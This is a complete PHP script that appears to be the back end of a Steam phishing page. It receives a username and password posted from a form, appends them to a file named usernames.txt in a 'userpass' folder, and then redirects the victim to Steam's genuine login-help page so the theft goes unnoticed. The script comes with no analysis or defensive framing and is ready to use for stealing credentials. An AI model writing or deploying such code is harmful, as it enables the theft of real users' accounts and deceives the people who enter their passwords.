<?php

file_put_contents("../userpass/usernames.txt", "Steam Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://help.steampowered.com/en/wizard/HelpWithLoginInfo/');
exit();
?>